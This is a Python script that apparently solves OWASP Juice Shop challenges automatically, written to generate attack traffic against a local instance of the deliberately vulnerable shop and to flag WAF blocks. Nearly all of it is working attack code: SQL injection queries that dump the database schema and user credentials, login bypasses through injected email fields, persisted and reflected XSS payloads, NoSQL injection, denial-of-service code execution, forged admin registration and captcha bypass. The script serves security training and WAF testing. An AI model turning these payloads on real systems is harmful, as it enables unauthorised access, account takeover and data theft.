#url='http://juiceshop.local:80' # Indicate the URL without '/' at the end
# Open this URL before running the script
# Oct 9, 2024 - Vince Mammoliti - vincem@checkpoint.com
print("Juice Shop Solver - Original code by Bryan Fauquembergue")
print("  - Enhanced to detect in line WAF blocking - by Vince Mammoliti, Oct 2024")
import sys
if len(sys.argv) == 1: sys.argv[1:] = ["http://juiceshop.local:80"]
url = sys.argv[1]

import requests
from requests.exceptions import HTTPError

# Vince - Adding Colours
CRED = '\033[91m'
CEND = '\033[0m'

import requests
from requests.exceptions import HTTPError

print("Creating Traffic Against URL: " +  url)
# ==== No required action ====
print("---- Arbitrary File Write - Overwrite the Legal Information file.")
requests.post(url+'/file-upload', files={'file':open('file-upload/Arbitrary File Write.zip','rb')})
# ---- Access Log (Gain access to any access log file of the server.)
requests.get(url+'/support/logs/access.log')
# ---- Admin Registration (Register as a user with administrator privileges.)
requests.post(url+'/api/Users',data={'email':'admin','password':'admin','role':'admin'})
# ---- Admin Section (Access the administration section of the store.)
requests.get(url+'/assets/public/images/padding/19px.png')
# ---- Blockchain Hype (Learn about the Token Sale before its official announcement.)
requests.get(url+'/assets/public/images/padding/56px.png')
# ---- Client-side XSS Protection (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a client-side security mechanism.)
requests.post(url+'/api/Users',data={'email':'<iframe src="javascript:alert(`xss`)">','password':'xss'})
# ---- Confidential Document (Access a confidential document.)
requests.get(url+'/ftp/acquisitions.md')
# ---- Database Schema (Exfiltrate the entire DB schema definition via SQL Injection.)
requests.get(url+'/rest/products/search',params={'q':'qwert\')) UNION SELECT sql,\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\' FROM sqlite_master--'})
# ---- Deprecated Interface (Use a deprecated B2B interface that was not properly shut down.)
requests.post(url+'/file-upload', files={'file':open('file-upload/Deprecated Interface.xml','rb')})
# ---- Easter Egg (Find the hidden easter egg.)
requests.get(url+'/ftp/eastere.gg%2500.md')
# ---- Email Leak (Perform an unwanted information disclosure by accessing data cross-domain.)
requests.get(url+'/rest/user/whoami', params={'callback':''})
# ---- Error Handling (Provoke an error that is neither very gracefully nor consistently handled.)
requests.get(url+'/rest/qwertz')
# ---- Extra Language (Retrieve the language file that never made it into production.)
requests.get(url+'/assets/i18n/tlh_AA.json')
# ---- Forgotten Developer Backup (Access a developer's forgotten backup file.)
requests.get(url+'/ftp/package.json.bak%2500.md')
# ---- Forgotten Sales Backup (Access a salesman's forgotten backup file.)
requests.get(url+'/ftp/coupons_2013.md.bak%2500.md')
# ---- Imaginary Challenge (Solve challenge #999. Unfortunately, this challenge does not exist.)
requests.put(url+'/rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj')
# ---- Misplaced Signature File (Access a misplaced SIEM signature file.)
requests.get(url+'/ftp/suspicious_errors.yml%2500.md')
# ---- Missing Encoding (Retrieve the photo of Bjoern's cat in "melee combat-mode".)
requests.get(url+'/assets/public/images/uploads/😼-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg')
# ---- Nested Easter Egg (Apply some advanced cryptanalysis to find the real easter egg.)
requests.get(url+'/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg')
# ---- NoSQL DoS (Let the server sleep for some time. (It has done more than enough hard work for you))
requests.get(url+'/rest/products/sleep(2000)/reviews')
# ---- NoSQL Exfiltration (All your orders are belong to us! Even the ones which don't.)
requests.get(url+'/rest/track-order/\'%20%7C%7C%20true%20%7C%7C%20\'')
# ---- Outdated Whitelist (Let us redirect you to one of our crypto currency addresses which are not promoted any longer.)
# Removed because lack of SSL libs
#requests.get(url+'/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm')
# ---- Premium Paywall ( Unlock Premium Challenge to access exclusive content.)
requests.get(url+'/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us')
# ---- Privacy Policy (Read our privacy policy.)
requests.get(url+'/assets/public/images/padding/81px.png')
# ---- Privacy Policy Inspection (Prove that you actually read our privacy policy.)
requests.get(url+'/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility')
# ---- Product Tampering (Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into https://owasp.slack.com.)
requests.put(url+'/api/Products/9', data={'description':'<a href="https://owasp.slack.com" target="_blank">More...</a>'})
# ---- Reflected XSS (Perform a reflected XSS attack with <iframe src="javascript:alert(`xss`)">.)
requests.get(url+'/rest/track-order/<iframe src="javascript:alert(`xss`)">')
# ---- Repetitive Registration (Follow the DRY principle while registering a user.)
requests.post(url+'/api/Users',data={'email':"aaaaaaa@juice-sh.op","password":"aaaaaaa","passwordRepeat":"aaaaaa","securityQuestion":{"id":6,"question":"Paternal grandmother's first name?","createdAt":"2020-01-16T14:58:58.420Z","updatedAt":"2020-01-16T14:58:58.420Z"},"securityAnswer":"aaaaaaa"})
# ---- Retrieve Blueprint (Deprive the shop of earnings by downloading the blueprint for one of its products.)
requests.get(url+'/assets/public/images/products/JuiceShop.stl')
# ---- Score Board (Find the carefully hidden 'Score Board' page.)
requests.get(url+'/assets/public/images/padding/1px.png')
# ---- Security Policy (Behave like any "white-hat" should before getting into the action.)
requests.get(url+'/.well-known/security.txt')
# ---- Upload Size (Upload a file larger than 100 kB.)
requests.post(url+'/file-upload', files={'file':open('file-upload/Upload Size.pdf','rb')})
# ---- Upload Type (Upload a file that has no .pdf or .zip extension.)
requests.post(url+'/file-upload', files={'file':open('file-upload/Upload Type.txt','rb')})
# ---- User Credentials (Retrieve a list of all user credentials via SQL Injection.)
requests.get(url+'/rest/products/search',params={'q':'qwert\')) UNION SELECT id, email, password, \'4\',\'5\',\'6\',\'7\',\'8\',\'9\' FROM Users--'})
# ---- Video XSS (Embed an XSS payload </script><script>alert(`xss`)</script> into our promo video.)
requests.post(url+'/file-upload', files={'file':open('file-upload/Video XSS.zip','rb')})
requests.get(url+'/promotion')
# ---- Whitelist Bypass (Enforce a redirect to a page you are not supposed to redirect to.)
# Removed as system does not have ssl libs
#requests.get(url+'/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop')

print("==== Login challenges ====")
# ---- Ephemeral Accountant (Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.)
requests.post(url+'/rest/user/login', data={'email':'\' UNION SELECT * FROM (SELECT 15 as \'id\', \'\' as \'username\', \'acc0unt4nt@juice-sh.op\' as \'email\', \'12345\' as \'password\', \'accounting\' as \'role\', \'1.2.3.4\' as \'lastLoginIp\', \'default.svg\' as \'profileImage\', \'\' as \'totpSecret\', 1 as \'isActive\', \'1999-08-16 14:14:41.644 +00:00\' as \'createdAt\', \'1999-08-16 14:33:41.930 +00:00\' as \'updatedAt\', null as \'deletedAt\')--','password':'a'})
# ---- GDPR Data Erasure (Log in with Chris' erased user account.)
requests.post(url+'/rest/user/login', data={'email':'chris.pike@juice-sh.op\'--','password':'a'})
# ---- Leaked Access Logs (Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to. (Creating a new account with the same password does not qualify as a solution.))
requests.post(url+'/rest/user/login', data={'email':'J12934@juice-sh.op','password':'0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB'})
# ---- Login Admin (Log in with the administrator's user account.)
requests.post(url+'/rest/user/login', data={'email':'admin@juice-sh.op','password':'admin123'})
# ---- Login Amy (Log in with Amy's original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note"))
requests.post(url+'/rest/user/login', data={'email':'amy@juice-sh.op','password':'K1f.....................'})
# ---- Login Bender (Log in with Bender's user account.)
requests.post(url+'/rest/user/login', data={'email':'bender@juice-sh.op\'--','password':'a'})
# ---- Login Bjoern (Log in with Bjoern's Gmail account without previously changing his password, applying SQL Injection, or hacking his Google account.)
requests.post(url+'/rest/user/login', data={'email':'bjoern.kimminich@gmail.com','password':'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='})
# ---- Login Jim (Log in with Jim's user account.)
requests.post(url+'/rest/user/login', data={'email':'jim@juice-sh.op','password':'ncc-1701'})
# ---- Login MC SafeSearch (Log in with MC SafeSearch's original user credentials without applying SQL Injection or any other bypass.)
requests.post(url+'/rest/user/login', data={'email':'mc.safesearch@juice-sh.op','password':'Mr. N00dles'})
# ---- Login Support Team (Log in with the support team's original user credentials without applying SQL Injection or any other bypass.)
requests.post(url+'/rest/user/login', data={'email':'support@juice-sh.op','password':'J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P'})
# ---- Password Strength (Log in with the administrator's user credentials without previously changing them or applying SQL Injection.)
# See "Login Admin" in this part

print("==== Change password challenges ====")
# ---- Bjoern's Favorite Pet (Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question.)
requests.post(url+'/rest/user/reset-password',data={'email':'bjoern@owasp.org','answer':'Zaya','new':'bjoern','repeat':'bjoern'})
print("Reset Bender's Password (Reset Bender's password via the Forgot Password mechanism with the original answer to his security question.)")
requests.post(url+'/rest/user/reset-password',data={'email':'bender@juice-sh.op','answer':'Stop\'n\'Drop','new':'bender','repeat':'bender'})
# ---- Reset Bjoern's Password (Reset the password of Bjoern's internal account via the Forgot Password mechanism with the original answer to his security question.)
requests.post(url+'/rest/user/reset-password',data={'email':'bjoern@juice-sh.op','answer':'West-2082','new':'bjoern','repeat':'bjoern'})
# ---- Reset Jim's Password (Reset Jim's password via the Forgot Password mechanism with the original answer to his security question.)
requests.post(url+'/rest/user/reset-password',data={'email':'jim@juice-sh.op','answer':'Samuel','new':'jimjim','repeat':'jimjim'})
# ---- Reset Morty's Password (Reset Morty's password via the Forgot Password mechanism with his obfuscated answer to his security question.)
requests.post(url+'/rest/user/reset-password',data={'email':'morty@juice-sh.op','answer':'5N0wb41L','new':'mortymorty','repeat':'mortymorty'})

# ==== Captcha ===
from json import loads
captcha=loads(requests.get(url+'/rest/captcha').text)
print("---- Captcha Bypass (Submit 10 or more customer feedbacks within 10 seconds.")
for i in range(11):
	requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'a','rating':3})
print("---- Forged Feedback (Post some feedback in another users name.)") 
# See "Captcha Bypass" part
# ---- Frontend Typosquatting (Inform the shop about a typosquatting imposter that dug itself deep into the frontend. (Mention the exact name of the culprit))
requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'ng2-bar-rating','rating':3})
# ---- Leaked Unsafe Product (Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous.)
requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'Eurogium Edule Hueteroneel','rating':3})
# ---- Legacy Typosquatting (Inform the shop about a typosquatting trick it has been a victim of at least in v6.2.0-SNAPSHOT. (Mention the exact name of the culprit))
requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'epilogue-js','rating':3})
print('---- Server-side XSS Protection (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a server-side security mechanism.)')
requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'<<script>Foo</script>iframe src="javascript:alert(`xss`)">','rating':3})
# ---- Steganography (Rat out a notorious character hiding in plain sight in the shop. (Mention the exact name of the character))
requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'Pickle Rick','rating':3})
# ---- Supply Chain Attack (Inform the development team about a danger to some of their credentials. (Send them the URL of the original report or the CVE of this vulnerability))
requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'https://github.com/eslint/eslint-scope/issues/39','rating':3})
# ---- Vulnerable Library (Inform the shop about a vulnerable library it is using. (Mention the exact library name and version in your comment))
requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'sanitize-html 1.4.2','rating':3})
# ---- Weird Crypto (Inform the shop about an algorithm or library it should definitely not use the way it does.)
requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'z85','rating':3})

# ==== Require to log in (admin account) ===
login=loads(requests.post(url+'/rest/user/login', data={'email':'admin@juice-sh.op','password':'admin123'}).text)['authentication']
# ---- API-only XSS (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> without using the frontend application at all.)
requests.post(url+'/api/Products', data={'name':'XSS','description':'<iframe src="javascript:alert(`xss`)">','price':47.11}, headers={'Authorization':'Bearer '+login['token']})
# ---- Blocked RCE DoS (Perform a Remote Code Execution that would keep a less hardened application busy forever.)
requests.post(url+'/b2b/v2/orders', data={'orderLinesData':'(function dos() { while(true); })()'}, headers={'Authorization':'Bearer '+login['token']})
# ---- Change Bender's Password (Change Bender's password into slurmCl4ssic without using SQL Injection or Forgot Password.)
try:
    response = requests.get(url+'/rest/user/change-password', params={'new':'slurmCl4ssic','repeat':'slurmCl4ssic'}, headers={'Authorization':'Bearer '+(loads(requests.post(url+'/rest/user/login',data={'email':'bender@juice-sh.op\';--','password':'a'}).text)['authentication']['token'])})
    response.raise_for_status()
    jsonResponse = response.json()
except HTTPError as http_err:
        print(f'HTTP error occurred: {http_err}')
except Exception as err:
        print(f'{CRED}>>> WAF Blocked <<<< {CEND} >>>> {err}')
print("---- GDPR Data Theft (Steal someone else's personal data without using Injection.)") 
requests.post(url+'/api/Users',data={'email':'edmin@juice-sh.op','password':'edmin123','role':'admin'})
requests.post(url+'/rest/user/data-export',data={'format':'1'},headers={'Authorization':'Bearer '+(loads(requests.post(url+'/rest/user/login',data={'email':'edmin@juice-sh.op','password':'edmin123'}).text)['authentication']['token'])})
# ---- HTTP-Header XSS (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> through an HTTP header.)
requests.get(url+'/rest/saveLoginIp', headers={'True-Client-IP':'<iframe src="javascript:alert(`xss`)">','Authorization':'Bearer '+login['token']})
print("---- Multiple Likes (Like any review at least three times as the same user.)")
productId=loads(requests.get(url+'/rest/products/3/reviews').text)['data'][0]['_id']
def sendRequest(specifiedUrl):
	requests.post(specifiedUrl, data={'id':productId}, headers={'Authorization':'Bearer '+login['token']})
from concurrent.futures import ThreadPoolExecutor
with ThreadPoolExecutor(max_workers=4) as pool:
	[x for x in pool.map(sendRequest,[url+'/rest/products/reviews',url+'/rest/products/reviews',url+'/rest/products/reviews',url+'/rest/products/reviews'])]
print("---- Successful RCE DoS (Perform a Remote Code Execution that occupies the server for a while without using infinite loops.)")
requests.post(url+'/b2b/v2/orders', data={'orderLinesData':'/((a+)+)b/.test(\'aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\')'}, headers={'Authorization':'Bearer '+login['token']})
print("---- View Basket (View another user's shopping basket.)")
requests.get(url+'/rest/basket/'+str(login['bid']+1), headers={'Authorization':'Bearer '+login['token']})
